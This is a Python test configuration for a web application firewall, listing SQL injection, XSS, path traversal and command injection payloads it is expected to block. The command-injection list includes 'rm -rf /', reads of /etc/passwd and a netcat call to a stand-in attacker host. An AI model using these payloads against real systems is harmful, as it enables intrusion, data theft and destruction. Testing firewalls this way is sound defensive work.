"""
Test Configuration for TestSprite Integration
"""

import os

# Test Environment Configuration
TEST_CONFIG = {
    "waf_url": os.getenv("WAF_URL", "http://localhost:5000"),
    "vulnerable_app_url": os.getenv("VULNERABLE_APP_URL", "http://localhost:8080"),
    "protected_app_url": os.getenv("PROTECTED_APP_URL", "http://localhost:5000/protected"),
    "timeout": int(os.getenv("TEST_TIMEOUT", "10")),
    "rate_limit_threshold": int(os.getenv("RATE_LIMIT_THRESHOLD", "100")),
}

# TestSprite Configuration
TESTSPRITE_CONFIG = {
    "enabled": os.getenv("TESTSPRITE_ENABLED", "true").lower() == "true",
    "api_key": os.getenv("TESTSPRITE_API_KEY", "your-api-key-here"),
    "report_format": "json",
    "parallel_tests": 4,
}

# Test Categories
TEST_CATEGORIES = [
    "sql_injection",
    "xss",
    "path_traversal",
    "rate_limiting",
    "header_injection",
    "command_injection",
    "legitimate_traffic",
    "performance",
]

# Attack Payloads Database
ATTACK_PAYLOADS = {
    "sql_injection": [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin' --",
        "' UNION SELECT NULL--",
        "1' AND '1'='1",
        "'; DROP TABLE users--",
        "' OR 'a'='a",
        "1' UNION SELECT username, password FROM users--",
    ],
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(1)'>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f",
        "..;/..;/..;/etc/passwd",
    ],
    "command_injection": [
        "; ls -la",
        "| cat /etc/passwd",
        "& dir",
        "`whoami`",
        "$(cat /etc/passwd)",
        "; rm -rf /",
        "| nc attacker.com 4444",
    ],
}

# Expected Results
EXPECTED_RESULTS = {
    "malicious_blocked": [403, 429],
    "legitimate_allowed": [200, 201, 302],
    "server_error": [500, 502, 503],
}
